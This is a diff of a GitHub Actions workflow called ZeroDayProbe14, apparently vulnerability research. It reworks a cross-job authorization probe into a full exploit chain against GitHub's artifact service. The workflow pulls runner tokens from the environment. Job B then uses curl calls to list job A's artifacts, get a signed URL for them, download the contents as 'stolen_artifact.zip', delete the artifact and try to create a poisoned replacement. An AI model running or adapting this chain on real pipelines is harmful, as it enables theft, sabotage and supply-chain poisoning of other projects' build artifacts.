@@ -1,4 +1,4 @@
-name: ZeroDayProbe13
+name: ZeroDayProbe14
 on:
   push:
     branches: [main]
@@ -9,8 +9,12 @@ permissions:
 jobs:
   job-a:
     runs-on: ubuntu-latest
+    outputs:
+      plan_id: ${{ steps.ids.outputs.plan_id }}
+      job_id: ${{ steps.ids.outputs.job_id }}
     steps:
-      - name: Grab job-A token via github-script (reliable Node.js env)
+      - name: Grab job-A token
+        id: ids
         uses: actions/github-script@v7
         with:
           github-token: ${{ github.token }}
@@ -19,58 +23,30 @@ jobs:
             const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
             const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
             const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
-            const runtimeUrl = process.env.ACTIONS_RUNTIME_URL || '';
             fs.writeFileSync('/tmp/ZD_A_RT.txt', rt);
             fs.writeFileSync('/tmp/ZD_A_OIDC_URL.txt', oidcUrl);
             fs.writeFileSync('/tmp/ZD_A_RESULTS_URL.txt', resultsUrl);
-            fs.writeFileSync('/tmp/ZD_A_RUNTIME_URL.txt', runtimeUrl);
-            core.info(`RT_A_LEN=${rt.length}`);
-            core.info(`RESULTS_URL=${resultsUrl}`);
-            core.info(`OIDC_URL=${oidcUrl}`);
-            // Also extract plan/job IDs
-            const match = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
-            if (match) {
-              core.info(`A_PLAN=${match[1]}`);
-              core.info(`A_JOB=${match[2]}`);
-            }
+            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
+            core.setOutput('plan_id', m ? m[1] : '');
+            core.setOutput('job_id', m ? m[2] : '');
+            core.info(`A_PLAN=${m ? m[1] : ''} A_JOB=${m ? m[2] : ''}`);
 
-      - name: Own-run baseline + export job-A IDs
-        run: |
-          RT=$(cat /tmp/ZD_A_RT.txt 2>/dev/null)
-          OIDC_URL=$(cat /tmp/ZD_A_OIDC_URL.txt 2>/dev/null)
-          RESULTS_URL=$(cat /tmp/ZD_A_RESULTS_URL.txt 2>/dev/null)
-          RUNTIME_URL=$(cat /tmp/ZD_A_RUNTIME_URL.txt 2>/dev/null)
-          echo "RT_A_LEN=${#RT}"
-          [ -z "$RT" ] && echo "NO_TOKEN_A" && exit 1
-
-          A_PLAN=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
-          A_JOB=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
-          echo "A_PLAN=$A_PLAN A_JOB=$A_JOB"
-
-          # Baseline: own-run should be 200
-          echo "=BASELINE_OWN="
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\"}"
-          echo ""
-
-          # Also test GetSignedURL for own job
-          echo "GetSignedURL own (no artifacts yet, should 200 empty or 404):"
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
-            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"probe-a\"}"
-          echo ""
-
-          printf 'PLAN_ID=%s\nJOB_ID=%s\nRESULTS_URL=%s\n' "$A_PLAN" "$A_JOB" "$RESULTS_URL" > /tmp/job_a_ids.txt
-          echo "probe_a" > /tmp/probe_a.txt
-
-      - name: Upload probe-a artifact
+      - name: Upload sensitive artifact (simulates secrets/build output)
         uses: actions/upload-artifact@v4
         with:
-          name: probe-a
-          path: /tmp/probe_a.txt
+          name: sensitive-build-output
+          path: /tmp/ZD_A_OIDC_URL.txt
 
-      - name: Upload job-A IDs for job-B
+      - name: Write IDs for job-B
+        run: |
+          RT=$(cat /tmp/ZD_A_RT.txt)
+          OIDC=$(cat /tmp/ZD_A_OIDC_URL.txt)
+          RESULTS=$(cat /tmp/ZD_A_RESULTS_URL.txt)
+          A_PLAN=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
+          A_JOB=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
+          printf 'PLAN_ID=%s\nJOB_ID=%s\nRESULTS_URL=%s\n' "$A_PLAN" "$A_JOB" "$RESULTS" > /tmp/job_a_ids.txt
+
+      - name: Upload job-A IDs
         uses: actions/upload-artifact@v4
         with:
           name: job-a-ids
@@ -80,7 +56,7 @@ jobs:
     runs-on: ubuntu-latest
     needs: job-a
     steps:
-      - name: Grab job-B token via github-script (reliable)
+      - name: Grab job-B token
         uses: actions/github-script@v7
         with:
           github-token: ${{ github.token }}
@@ -89,19 +65,11 @@ jobs:
             const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
             const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
             const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
-            const runtimeUrl = process.env.ACTIONS_RUNTIME_URL || '';
             fs.writeFileSync('/tmp/ZD_B_RT.txt', rt);
             fs.writeFileSync('/tmp/ZD_B_OIDC_URL.txt', oidcUrl);
             fs.writeFileSync('/tmp/ZD_B_RESULTS_URL.txt', resultsUrl);
-            fs.writeFileSync('/tmp/ZD_B_RUNTIME_URL.txt', runtimeUrl);
-            core.info(`RT_B_LEN=${rt.length}`);
-            core.info(`RESULTS_URL=${resultsUrl}`);
-            core.info(`OIDC_URL=${oidcUrl}`);
-            const match = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
-            if (match) {
-              core.info(`B_PLAN=${match[1]}`);
-              core.info(`B_JOB=${match[2]}`);
-            }
+            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
+            core.info(`B_PLAN=${m ? m[1] : ''} B_JOB=${m ? m[2] : ''}`);
 
       - name: Download job-A IDs
         uses: actions/download-artifact@v4
@@ -109,68 +77,74 @@ jobs:
           name: job-a-ids
           path: /tmp/job_a_data/
 
-      - name: Cross-job BOLA test (critical test)
+      - name: Supply chain poison test + full PoC chain
         run: |
-          RT_B=$(cat /tmp/ZD_B_RT.txt 2>/dev/null)
-          B_OIDC=$(cat /tmp/ZD_B_OIDC_URL.txt 2>/dev/null)
-          RESULTS_URL=$(cat /tmp/ZD_B_RESULTS_URL.txt 2>/dev/null)
-
-          echo "RT_B_LEN=${#RT_B}"
-          [ -z "$RT_B" ] && echo "NO_TOKEN_B" && exit 1
-
+          RT_B=$(cat /tmp/ZD_B_RT.txt)
+          B_OIDC=$(cat /tmp/ZD_B_OIDC_URL.txt)
+          RESULTS_URL=$(cat /tmp/ZD_B_RESULTS_URL.txt)
           B_PLAN=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
           B_JOB=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
-          echo "B_PLAN=$B_PLAN B_JOB=$B_JOB"
-
           A_PLAN=$(grep "^PLAN_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
           A_JOB=$(grep "^JOB_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
+          echo "B_PLAN=$B_PLAN B_JOB=$B_JOB"
           echo "A_PLAN=$A_PLAN A_JOB=$A_JOB"
           echo "SAME_PLAN=$([ "$A_PLAN" = "$B_PLAN" ] && echo YES || echo NO)"
 
-          echo "=CROSS_JOB_BOLA="
-
-          echo "T1 ListArtifacts job-A IDs via job-B token:"
+          echo "=CHAIN_STEP1_ENUMERATE="
+          # Step 1: Enumerate all artifacts in the run using own credentials
+          LIST_RESP=$(curl -s -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}")
+          echo "ListArtifacts own (returns ALL run artifacts): HTTP=?"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
             -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\"}"
+            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}"
           echo ""
 
-          echo "T2 GetSignedArtifactURL probe-a via job-B token:"
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
+          echo "=CHAIN_STEP2_GET_SIGNED_URL="
+          # Step 2: Get signed URL for job-A's sensitive artifact
+          SIGNED_RESP=$(curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
             -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"probe-a\"}"
-          echo ""
+            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\"}")
+          echo "GetSignedArtifactURL cross-job:"
+          echo "$SIGNED_RESP"
+          # Extract the signed URL
+          SIGNED_URL=$(echo "$SIGNED_RESP" | grep -o '"signed_url":"[^"]*"' | cut -d'"' -f4)
+          echo "SIGNED_URL_EXTRACTED=$([ -n "$SIGNED_URL" ] && echo YES || echo NO)"
 
-          echo "T3 DeleteArtifact probe-a via job-B token (cross-job destructive):"
+          echo "=CHAIN_STEP3_DOWNLOAD="
+          # Step 3: Actually download the artifact content
+          if [ -n "$SIGNED_URL" ]; then
+            echo "Downloading artifact via SAS URL..."
+            curl -s -w "\nDOWNLOAD_HTTP=%{http_code}" -o /tmp/stolen_artifact.zip "$SIGNED_URL"
+            echo ""
+            echo "Downloaded file size: $(wc -c < /tmp/stolen_artifact.zip 2>/dev/null || echo 0) bytes"
+            ls -la /tmp/stolen_artifact.zip 2>/dev/null || echo "File not found"
+          else
+            echo "No signed URL to download"
+          fi
+
+          echo "=CHAIN_STEP4_DELETE="
+          # Step 4: Delete the artifact (supply chain sabotage)
+          echo "Deleting sensitive-build-output from job-A:"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
             -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"probe-a\"}"
+            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\"}"
           echo ""
 
-          echo "T4 CreateArtifact into job-A namespace via job-B token:"
+          echo "=CHAIN_STEP5_POISON_CREATE="
+          # Step 5: Try to create a replacement artifact with same name in job-A's namespace (supply chain poison)
+          echo "CreateArtifact in job-A namespace (supply chain poison attempt):"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
             -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"injected-by-b\",\"version\":4}"
+            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\",\"version\":4}"
           echo ""
 
-          echo "T5 Own-plan + job-A job_id (cross-job mixed):"
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+          # Step 5b: Can we create with OWN job IDs but same name? (Name collision)
+          echo "CreateArtifact own namespace same name (name collision test):"
+          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
             -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\"}"
+            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\",\"name\":\"sensitive-build-output\",\"version\":4}"
           echo ""
 
-          echo "T6 Own-job sanity (expect 200):"
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}"
-          echo ""
-
-          echo "T7 GITHUB_TOKEN with Twirp (wrong token type):"
-          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-            -H "Authorization: Bearer $GITHUB_TOKEN" -H "Content-Type: application/json" \
-            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}"
-          echo ""
-
-          echo "=CROSS_JOB_BOLA_END="
-        env:
-          GITHUB_TOKEN: ${{ github.token }}
+          echo "=CHAIN_COMPLETE="
